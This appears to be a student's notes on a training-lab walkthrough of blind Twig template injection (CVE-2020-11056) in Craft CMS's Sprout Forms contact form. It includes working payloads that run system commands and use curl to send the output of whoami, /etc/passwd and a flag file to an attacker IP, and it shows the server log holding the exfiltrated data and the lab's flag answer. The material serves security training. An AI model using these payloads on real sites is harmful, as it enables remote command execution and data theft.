#### 11.8.1. Accessing Craft CMS

```bash
kali@kali:~$ sudo mousepad /etc/hosts

kali@kali:~$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

192.168.50.105  craft
```

##### Labs
`Craft CMS`
![[Pasted image 20241029200645.png]]

---------

#### 11.8.2 Craft CMS with Sprout Forms - Discovery

Originally, the vulnerability `(CVE-2020-11056)` was discovered by Paweł Hałdrzyński and Daniel Kalinowski. This is an email template vulnerability, meaning we'll need a way to view the emails that we would receive from the application. We can find an SMTP catcher on port `8025` of the same host as our target.

Let's nevertheless attack this application from a black box perspective and start discovery as if we have no information about the target. We'll enumerate the application and find the required information to exploit the target.

We can start enumeration by visiting the site to view its contents.

![[Pasted image 20241029200853.png]]
The home page is minimal, displaying only a form to get in contact with the administrator. Let's inspect the source of the HTML for any clues about the target.
![[Pasted image 20241029201021.png]]
The source gives us two clues about the application. First, we find that the application is indeed running Craft CMS, based on the value of the CSRF token. Next, we find the use of brackets in the `name` attribute of the `input` field, which is a common (although not exclusive) feature of PHP applications.

Let's run gobuster to search for additional endpoints on the target. We'll provide it the common.txt wordlist from dirb and the URL of the application.

```bash
┌──(root💀gobots)-[30Oct2024 00:10:54]-[/home/kali]
└─# gobuster dir --wordlist /usr/share/wordlists/dirb/common.txt --url http://craft/
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://craft/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.history             (Status: 403) [Size: 146]
/.cache               (Status: 403) [Size: 146]
/.bashrc              (Status: 403) [Size: 146]
/.cvsignore           (Status: 403) [Size: 146]
/.hta                 (Status: 403) [Size: 146]
/.config              (Status: 403) [Size: 146]
/.bash_history        (Status: 403) [Size: 146]
/.git/HEAD            (Status: 403) [Size: 146]
/.forward             (Status: 403) [Size: 146]
/.cvs                 (Status: 403) [Size: 146]
/.htaccess            (Status: 403) [Size: 146]
/.mysql_history       (Status: 403) [Size: 146]
/.listing             (Status: 403) [Size: 146]
/.listings            (Status: 403) [Size: 146]
/.ssh                 (Status: 403) [Size: 146]
/.htpasswd            (Status: 403) [Size: 146]
/.sh_history          (Status: 403) [Size: 146]
/.perf                (Status: 403) [Size: 146]
/.rhosts              (Status: 403) [Size: 146]
/.profile             (Status: 403) [Size: 146]
/.passwd              (Status: 403) [Size: 146]
/.web                 (Status: 403) [Size: 146]
/.subversion          (Status: 403) [Size: 146]
/.swf                 (Status: 403) [Size: 146]
/.svn/entries         (Status: 403) [Size: 146]
/.svn                 (Status: 403) [Size: 146]
/admin                (Status: 302) [Size: 0] [--> http://craft/admin/login]
```

By running gobuster, we discover three unique endpoints: /admin, /index, and /logout. However, /index, and /logout point to the home page that we've already reviewed. This leaves /admin as the only unique endpoint left that we have not reviewed. Let's navigate to it.

![[Pasted image 20241029201239.png]]
Upon visiting `/admin`, we are immediately redirected to log in. While we don't have credentials, we do find another confirmation that we are running Craft CMS.

With the application enumerated, let's attempt a more active attack. Outside of admin login, the only other user input we've discovered is on the home page. Let's attempt to send a valid message to the administrator.
![[Pasted image 20241029201704.png]]
With the message sent, let's open our inbox to check for any type of confirmation. We can find the mailbox at the same URL on port `8025`.
![[Pasted image 20241029201737.png]]
We confirm we received a message via email. Emails are great targets for SSTI since an email will commonly be comprised of mainly generic contents, but will be tailored to the user using some form of templating engine.

This is a PHP application, and a web search for "Craft templating" shows that Craft CMS uses Twig,[1](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/craft-cms-with-sprout-forms-case-study-31282/craft-cms-with-sprout-forms-discovery-31078#fn-local_id_102-1) so we can assume that this form would also use Twig as the templating engine. Let's try to introduce a Twig template and observe the response. We'll use a payload that multiplies two numbers.
![[Pasted image 20241029202023.png]]

```php
{{5*5}}
```
When we click _Submit_, the application responds normally, but when we check our inbox, we find no email. Initially, this seems like a mistake, but if we send the payload again, we observe the same result. This must mean that the template injection is causing an error somewhere. We might be dealing with a blind SSTI. In order to know if the template is being executed, let's try to change the payload to something that will produce a response. Since we can't review the output, we'll need some form of out-of-band communication. For example, if we can get the templating engine to return a curl request to us, we can prove that the templating engine is rendering our payload and system commands are being executed.

Let's use the _reduce_ filter to execute the _system_ command. We'll pass a curl command to our Kali IP.

```php
{{[0]|reduce('system','curl http://192.168.45.222/helloFromTheOtherSide')}}
```
![[Pasted image 20241029202446.png]]
![[Pasted image 20241029202500.png]]

Excellent! We now have command execution on the target. Unfortunately, without the response, the command execution won't be very useful. However, we _can_ create a payload that executes a command and exfiltrates the data back to us.

--------

#### 11.8.3. Craft CMS with Sprout Forms - Exploitation

Let's use the Twig template sandbox to develop the payload, since we can develop the payload more quickly in an interactive session than via trial-and-error using a blind SSTI.

![[Pasted image 20241029210139.png]]
We'll start the payload with the curl request we already sent, so the command output will be exfiltrated back to our server. Let's modify this payload to concatenate, or join, some data to the request. Reviewing the Twig documentation, we find that concatenation in Twig is done via the tilde (~) character.[1](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/craft-cms-with-sprout-forms-case-study-31282/craft-cms-with-sprout-forms-exploitation-31065#fn-local_id_261-1) Let's name the variable we are concatenating _exfil_.

```php
{{[0]|reduce('system','curl http://192.168.45.222/?exfil=' ~ exfil)}}
```

When we review our Python HTTP server log, we find a request with the _exfil_ parameter.
![[Pasted image 20241029210402.png]]
Since we don't have the _exfil_ variable set, its value is empty. Let's work on setting this variable next. We'll have to URL-encode any data that we send to ensure that it can be sent accurately. Conveniently for us, Twig provides a URL encoding filter by default.[2](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/craft-cms-with-sprout-forms-case-study-31282/craft-cms-with-sprout-forms-exploitation-31065#fn-local_id_261-2) We'll use a statement to set a variable to a string and pass it through the _url_encode_ filter.

```php
{% set exfil = "Hello & Goodbye"| url_encode %}
{{[0]|reduce('system','curl http://192.168.45.222/?exfil=' ~ exfil)}}
```
We'll type the highlighted string in Listing 54 into our sandbox environment. When we view the HTTP server log, we can find the encoded message.
![[Pasted image 20241029210747.png]]
At this point, all that's left is to execute the command we want and replace the message in Listing 54 with the output of the command.

To execute a command and set the variable, we'll use the _set_ tag to save the entire multi-line output of the command.[3](https://portal.offsec.com/courses/web-200-28380/learning/server-side-template-injection-discovery-and-exploitation-30963/craft-cms-with-sprout-forms-case-study-31282/craft-cms-with-sprout-forms-exploitation-31065#fn-local_id_261-3) We'll call this variable _output_. In the tag, we'll execute the command we want. Let's start with whoami first and later cat out /etc/passwd in Craft.

```php
{% set output %}
{{[0]|reduce('system','whoami')}}
{% endset %}

{% set exfil = output| url_encode %}
{{[0]|reduce('system','curl http://192.168.45.222/?exfil=' ~ exfil)}}
```

![[Pasted image 20241029210936.png]]
When we place the template in Listing 56 into our sandbox, we will find the output is logged on our HTTP server.
![[Pasted image 20241029210949.png]]
With the payload built, let's copy and paste it into the contact form and review the output. This time, however, we'll change the command to display `/etc/passwd`.

When we click _Submit_, we receive a log in our HTTP server with the contents of the `/etc/passwd file`.

```bash
┌──(root💀gobots)-[30Oct2024 00:12:04]-[/home/kali]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.233.105 - - [30/Oct/2024 00:23:37] code 404, message File not found
192.168.233.105 - - [30/Oct/2024 00:23:37] "GET /helloFromTheOtherSide HTTP/1.1" 404 -
192.168.233.105 - - [30/Oct/2024 01:03:34] "GET /?exfil= HTTP/1.1" 200 -
192.168.233.105 - - [30/Oct/2024 01:07:35] "GET /?exfil=Hello%20%26%20Goodbye HTTP/1.1" 200 -
192.168.233.105 - - [30/Oct/2024 01:09:13] "GET /?exfil=%3Cbr%20%2F%3E%0Awww-data%0Awww-data%3Cbr%20%2F%3E%0A HTTP/1.1" 200 -
192.168.233.105 - - [30/Oct/2024 01:10:56] "GET /?exfil=%3Cbr%20%2F%3E%0Aroot%3Ax%3A0%3A0%3Aroot%3A%2Froot%3A%2Fbin%2Fash%0Abin%3Ax%3A1%3A1%3Abin%3A%2Fbin%3A%2Fsbin%2Fnologin%0Adaemon%3Ax%3A2%3A2%3Adaemon%3A%2Fsbin%3A%2Fsbin%2Fnologin%0Aadm%3Ax%3A3%3A4%3Aadm%3A%2Fvar%2Fadm%3A%2Fsbin%2Fnologin%0Alp%3Ax%3A4%3A7%3Alp%3A%2Fvar%2Fspool%2Flpd%3A%2Fsbin%2Fnologin%0Async%3Ax%3A5%3A0%3Async%3A%2Fsbin%3A%2Fbin%2Fsync%0Ashutdown%3Ax%3A6%3A0%3Ashutdown%3A%2Fsbin%3A%2Fsbin%2Fshutdown%0Ahalt%3Ax%3A7%3A0%3Ahalt%3A%2Fsbin%3A%2Fsbin%2Fhalt%0Amail%3Ax%3A8%3A12%3Amail%3A%2Fvar%2Fmail%3A%2Fsbin%2Fnologin%0Anews%3Ax%3A9%3A13%3Anews%3A%2Fusr%2Flib%2Fnews%3A%2Fsbin%2Fnologin%0Auucp%3Ax%3A10%3A14%3Auucp%3A%2Fvar%2Fspool%2Fuucppublic%3A%2Fsbin%2Fnologin%0Aoperator%3Ax%3A11%3A0%3Aoperator%3A%2Froot%3A%2Fsbin%2Fnologin%0Aman%3Ax%3A13%3A15%3Aman%3A%2Fusr%2Fman%3A%2Fsbin%2Fnologin%0Apostmaster%3Ax%3A14%3A12%3Apostmaster%3A%2Fvar%2Fmail%3A%2Fsbin%2Fnologin%0Acron%3Ax%3A16%3A16%3Acron%3A%2Fvar%2Fspool%2Fcron%3A%2Fsbin%2Fnologin%0Aftp%3Ax%3A21%3A21%3A%3A%2Fvar%2Flib%2Fftp%3A%2Fsbin%2Fnologin%0Asshd%3Ax%3A22%3A22%3Asshd%3A%2Fdev%2Fnull%3A%2Fsbin%2Fnologin%0Aat%3Ax%3A25%3A25%3Aat%3A%2Fvar%2Fspool%2Fcron%2Fatjobs%3A%2Fsbin%2Fnologin%0Asquid%3Ax%3A31%3A31%3ASquid%3A%2Fvar%2Fcache%2Fsquid%3A%2Fsbin%2Fnologin%0Axfs%3Ax%3A33%3A33%3AX%20Font%20Server%3A%2Fetc%2FX11%2Ffs%3A%2Fsbin%2Fnologin%0Agames%3Ax%3A35%3A35%3Agames%3A%2Fusr%2Fgames%3A%2Fsbin%2Fnologin%0Acyrus%3Ax%3A85%3A12%3A%3A%2Fusr%2Fcyrus%3A%2Fsbin%2Fnologin%0Avpopmail%3Ax%3A89%3A89%3A%3A%2Fvar%2Fvpopmail%3A%2Fsbin%2Fnologin%0Antp%3Ax%3A123%3A123%3ANTP%3A%2Fvar%2Fempty%3A%2Fsbin%2Fnologin%0Asmmsp%3Ax%3A209%3A209%3Asmmsp%3A%2Fvar%2Fspool%2Fmqueue%3A%2Fsbin%2Fnologin%0Aguest%3Ax%3A405%3A100%3Aguest%3A%2Fdev%2Fnull%3A%2Fsbin%2Fnologin%0Anobody%3Ax%3A65534%3A65534%3Anobody%3A%2F%3A%2Fsbin%2Fnologin%0Awww-data%3Ax%3A82%3A82%3ALinux%20User%2C%2C%2C%3A%2Fhome%2Fwww-data%3A%2Fsbin%2Fnologin%0Autmp%3Ax%3A100%3A406%3Autmp%3A%2Fhome%2Futmp%3A%2Fbin%2Ffalse%0Anginx%3Ax%3A101%3A101%3Anginx%3A%2Fvar%2Flib%2Fnginx%3A%2Fsbin%2Fnologin%0Anginx%3Ax%3A101%3A101%3Anginx%3A%2Fvar%2Flib%2Fnginx%3A%2Fsbin%2Fnologin%3Cbr%20%2F%3E%0A HTTP/1.1" 200 -
```
Let's decode this response in Burp Suite to receive the contents in a readable format. We'll click on the _Decoder_ tab of Burp Suite and paste the response into the text box.

![[Pasted image 20241029211402.png]]
Next, we'll click the _Decode as ..._ drop-down and select _URL_.
![[Pasted image 20241029211414.png]]
Once the process completes, we should receive a decoded version of our response.
![[Pasted image 20241029211354.png]]
Excellent! We can now execute any command and retrieve the output.

----------
##### Labs
`OS{SvezeAmputiranaRukaSatrijanija}`
![[Pasted image 20241029212240.png]]
Payload
```php
{% set output %}
{{[0]|reduce('system','cat /flag.txt')}}
{% endset %}

{% set exfil = output| url_encode %}
{{[0]|reduce('system','curl http://192.168.45.222/?exfil=' ~ exfil)}}
```
Website where it was inserted
![[Pasted image 20241029212041.png]]
python server
![[Pasted image 20241029212115.png]]
URL Decoder
![[Pasted image 20241029212140.png]]

